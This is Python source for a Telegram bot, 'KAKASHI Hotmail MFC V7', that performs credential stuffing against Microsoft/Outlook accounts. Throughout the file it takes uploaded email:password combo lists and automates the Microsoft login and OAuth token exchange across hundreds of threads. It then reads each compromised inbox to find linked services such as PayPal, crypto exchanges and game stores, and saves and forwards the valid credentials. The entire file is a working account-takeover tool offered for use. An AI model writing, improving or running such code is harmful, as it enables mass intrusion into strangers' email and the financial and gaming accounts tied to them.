import os
import sys
import time
import uuid
import pycountry
import requests
import threading
import concurrent.futures
import random
import re
from threading import Lock, Semaphore

from colorama import init
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler

# Import services
from services import services

# ====================== BOT TOKEN FROM RAILWAY ======================
TOKEN = os.getenv("TOKEN")

if not TOKEN:
    print("❌ CRITICAL ERROR: TOKEN environment variable is not set!")
    sys.exit(1)

print(f"✅ Token loaded successfully! Bot starting...")

# ====================== GLOBAL COUNTERS ======================
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)
progress_message_id = None

init(autoreset=True)

# Category wise services
CATEGORIES = {
    "Social Media": ["Facebook", "Instagram", "TikTok", "Twitter", "LinkedIn", "Pinterest", "Reddit", "Snapchat", "VK", "WeChat"],
    "Messaging": ["WhatsApp", "Telegram", "Discord", "Signal", "Line"],
    "Streaming": ["Netflix", "Spotify", "Twitch", "YouTube", "Vimeo", "Disney+", "Hulu", "HBO Max", "Amazon Prime", "Apple TV+", "Crunchyroll"],
    "Shopping": ["Amazon", "eBay", "Shopify", "Etsy", "AliExpress", "Walmart", "Target", "Best Buy", "Newegg", "Wish"],
    "Payment & Finance": ["PayPal", "Binance", "Coinbase", "Kraken", "Bitfinex", "OKX", "Bybit", "Bitkub", "Revolut", "TransferWise", "Venmo", "Cash App"],
    "Gaming": ["Steam", "Xbox", "PlayStation", "EpicGames", "Rockstar", "EA Sports", "Ubisoft", "Blizzard", "Riot Games", "Valorant", "Genshin Impact", "PUBG", "Free Fire", "Mobile Legends", "Call of Duty", "Fortnite", "Roblox", "Minecraft", "Supercell", "Nintendo"],
}

# ====================== ANIMATED PROGRESS BAR (Video Style) ======================
def create_progress_bar(percentage, length=25):
    filled = int(length * percentage / 100)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {percentage:.1f}%"

async def update_progress_message(context, chat_id):
    global progress_message_id
    while processed < total_combos and total_combos > 0:
        with lock:
            progress_pct = min((processed / total_combos * 100), 100)
            bar = create_progress_bar(progress_pct)
            linked_total = sum(linked_accounts.values())
            msg = f"""
🔄 <b>LIVE PROGRESS</b>
{bar}

📊 {processed}/{total_combos} combos checked
✅ Hits: {hit}
❌ Bad: {bad}
🔄 Retries: {retry}
🔗 Linked Services: {linked_total}
"""
        try:
            if progress_message_id:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_message_id, text=msg, parse_mode='HTML')
            else:
                sent = await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='HTML')
                progress_message_id = sent.message_id
        except:
            pass
        time.sleep(6)

# ====================== HELPER FUNCTIONS ======================
def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except LookupError:
        return '🏳'

def save_account_by_type(service_name, email, password):
    if service_name in services:
        if not os.path.exists("Accounts"):
            os.makedirs("Accounts")
        filename = os.path.join("Accounts", services[service_name]["file"])
        account_line = f"{email}:{password}\n"
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                if account_line in f.readlines():
                    return
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(account_line)
        with lock:
            linked_accounts[service_name] = linked_accounts.get(service_name, 0) + 1

def get_capture(email, password, token, cid, context, update):
    global hit
    try:
        headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)

        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        inbox_headers = {"Host": "outlook.live.com", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "x-owa-sessionid": cid}
        inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text

        linked_services = []
        for service_name, info in services.items():
            if info["sender"] in inbox_response:
                linked_services.append(f"✔ {service_name}")
                save_account_by_type(service_name, email, password)

        linked_str = "\n".join(linked_services) if linked_services else "No linked services found"

        capture = f"""
🔱 HOTMAİL HİT BULUNDU 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_str}

📊 Toplam Hit: {hit + 1}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""
        context.bot.send_message(update.effective_chat.id, capture.strip(), parse_mode='HTML')

        with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture + "\n" + "="*60 + "\n")

        with lock:
            hit += 1
            processed += 1
    except:
        with lock:
            processed += 1

def check_account(email, password):
    try:
        session = requests.Session()
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Origin": "https://login.live.com","Referer": r2.url}, allow_redirects=False, timeout=15)
        
        if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
            return {"status": "BAD"}
        
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        
        code = code_match.group(1)
        
        token_data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type": "authorization_code","code": code,"scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        
        access_token = r4.json()["access_token"]
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        return {"status": "HIT", "token": access_token, "cid": cid}
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception:
        return {"status": "RETRY"}

def check_combo(email, password, context, update):
    global hit, bad, retry, processed
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock: processed += 1
        return
    checked_accounts.add(account_id)

    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        result = check_account(email, password)
        with lock:
            if result.get("status") == "HIT":
                get_capture(email, password, result.get("token"), result.get("cid"), context, update)
            elif result.get("status") == "BAD":
                bad += 1
            else:
                retry += 1
            processed += 1

# ====================== SERVICE SELECTION (Video Style) ======================
def category_keyboard():
    keyboard = [
        [InlineKeyboardButton("📱 Social Media", callback_data="cat_Social Media")],
        [InlineKeyboardButton("💬 Messaging", callback_data="cat_Messaging")],
        [InlineKeyboardButton("📺 Streaming", callback_data="cat_Streaming")],
        [InlineKeyboardButton("🛒 Shopping", callback_data="cat_Shopping")],
        [InlineKeyboardButton("💰 Payment & Finance", callback_data="cat_Payment & Finance")],
        [InlineKeyboardButton("🎮 Gaming", callback_data="cat_Gaming")],
        [InlineKeyboardButton("🌐 Select All Services", callback_data="select_all")]
    ]
    return InlineKeyboardMarkup(keyboard)

def service_keyboard(category, selected):
    services_list = CATEGORIES[category]
    keyboard = []
    for srv in services_list:
        status = "✅" if srv in selected else "⬜"
        keyboard.append([InlineKeyboardButton(f"{status} {srv}", callback_data=f"svc_{srv}")])
    keyboard.append([InlineKeyboardButton("✅ Select All", callback_data=f"select_all_in_{category}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_cat")])
    keyboard.append([InlineKeyboardButton("✅ Done", callback_data="done_selection")])
    return InlineKeyboardMarkup(keyboard)

# ====================== CONVERSATION STATES ======================
SELECT_CATEGORY, UPLOAD_COMBO, ENTER_THREADS = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global progress_message_id
    progress_message_id = None
    context.user_data['selected_services'] = set()
    await update.message.reply_text("🔥 <b>KAKASHI Hotmail MFC V7</b>\n\nSelect services first:", parse_mode='HTML', reply_markup=category_keyboard())
    return SELECT_CATEGORY

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    selected = context.user_data.get('selected_services', set())

    if data.startswith("cat_"):
        category = data[4:]
        context.user_data['current_category'] = category
        await query.edit_message_text(f"📌 {category} Services:\nChoose which ones to check:", reply_markup=service_keyboard(category, selected))

    elif data.startswith("svc_"):
        service = data[4:]
        if service in selected:
            selected.remove(service)
        else:
            selected.add(service)
        context.user_data['selected_services'] = selected
        category = context.user_data.get('current_category')
        await query.edit_message_text(f"📌 {category} Services:\nChoose which ones to check:", reply_markup=service_keyboard(category, selected))

    elif data.startswith("select_all_in_"):
        category = data[14:]
        for srv in CATEGORIES[category]:
            selected.add(srv)
        context.user_data['selected_services'] = selected
        await query.edit_message_text(f"📌 {category} Services:\nChoose which ones to check:", reply_markup=service_keyboard(category, selected))

    elif data == "select_all":
        for cat_services in CATEGORIES.values():
            selected.update(cat_services)
        context.user_data['selected_services'] = selected
        await query.edit_message_text("🌐 All services have been selected!\nNow send your combo file (.txt)", reply_markup=None)
        return UPLOAD_COMBO

    elif data == "back_to_cat":
        await query.edit_message_text("🔥 Select services:", reply_markup=category_keyboard())

    elif data == "done_selection":
        if not selected:
            await query.edit_message_text("⚠️ Please select at least 1 service!", reply_markup=category_keyboard())
            return SELECT_CATEGORY
        await query.edit_message_text(f"✅ {len(selected)} services selected!\nNow send your combo file (.txt)")
        return UPLOAD_COMBO

    return SELECT_CATEGORY

async def receive_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.document:
        file = await update.message.document.get_file()
        await file.download_to_drive("combo.txt")
        context.user_data['combo_file'] = "combo.txt"
        await update.message.reply_text("✅ Combo file received!\n\nSend number of threads (20-500 recommended):")
        return ENTER_THREADS
    await update.message.reply_text("Please send combo as .txt file!")
    return UPLOAD_COMBO

async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        threads = int(update.message.text.strip())
        if not 1 <= threads <= 1000:
            raise ValueError
        context.user_data['threads'] = threads
        await update.message.reply_text(f"🚀 Starting check with {threads} threads...\nAnimated live progress bar activated!")
        threading.Thread(target=run_checker, args=(context, update), daemon=True).start()
        return ConversationHandler.END
    except:
        await update.message.reply_text("❌ Please send a valid number (1-1000)")
        return ENTER_THREADS

def run_checker(context, update):
    global total_combos, processed, hit, bad, retry, linked_accounts, progress_message_id
    hit = bad = retry = processed = 0
    linked_accounts.clear()
    checked_accounts.clear()
    progress_message_id = None

    with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if ":" in line]
    total_combos = len(lines)

    context.bot.send_message(update.effective_chat.id, f"📊 Total combos loaded: {total_combos}\nStarting check...")

    threading.Thread(target=update_progress_message, args=(context, update.effective_chat.id), daemon=True).start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=context.user_data.get('threads', 50)) as executor:
        for line in lines:
            try:
                email, pw = line.split(":", 1)
                executor.submit(check_combo, email.strip(), pw.strip(), context, update)
            except:
                continue

    time.sleep(5)
    context.bot.send_message(update.effective_chat.id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}")

# ====================== MAIN ======================
def main():
    if not os.path.exists("Accounts"):
        os.makedirs("Accounts")
    
    app = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            SELECT_CATEGORY: [CallbackQueryHandler(button_handler)],
            UPLOAD_COMBO: [MessageHandler(filters.Document.ALL, receive_combo)],
            ENTER_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_threads)],
        },
        fallbacks=[],
    )
    
    app.add_handler(conv_handler)
    print("🤖 KAKASHI Bot (Video Style) is running... Send /start")
    app.run_polling()

if __name__ == "__main__":
    main()